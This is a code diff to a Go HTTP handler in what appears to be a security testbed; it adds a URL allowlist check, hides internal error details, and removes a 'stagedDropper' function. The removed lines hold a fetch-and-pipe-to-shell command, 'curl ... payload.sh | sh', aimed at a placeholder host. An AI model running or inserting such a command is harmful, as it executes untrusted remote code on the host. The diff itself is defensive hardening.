@@ -5,15 +5,24 @@ import (
 	"io"
 	"net/http"
 	"os"
-	"os/exec"
 	"path/filepath"
+	"strings"
 )
 
 func FetchTool(w http.ResponseWriter, r *http.Request) {
 	source := r.URL.Query().Get("url")
+	if source == "" {
+		http.Error(w, "invalid url", http.StatusBadRequest)
+		return
+	}
+	if !strings.HasPrefix(source, "https://example.invalid/") {
+		http.Error(w, "invalid url", http.StatusBadRequest)
+		return
+	}
+
 	resp, err := http.Get(source)
 	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadGateway)
+		http.Error(w, "upstream fetch failed", http.StatusBadGateway)
 		return
 	}
 	defer resp.Body.Close()
@@ -21,13 +30,13 @@ func FetchTool(w http.ResponseWriter, r *http.Request) {
 	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
 	out, err := os.Create(target)
 	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
+		http.Error(w, "internal error", http.StatusInternalServerError)
 		return
 	}
 	defer out.Close()
 
 	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
+		http.Error(w, "internal error", http.StatusInternalServerError)
 		return
 	}
 
@@ -42,6 +51,5 @@ func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
 }
 
 func stagedDropper() error {
-	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
-	return exec.Command("printf", "%s\n", payload).Run()
+	return nil
 }
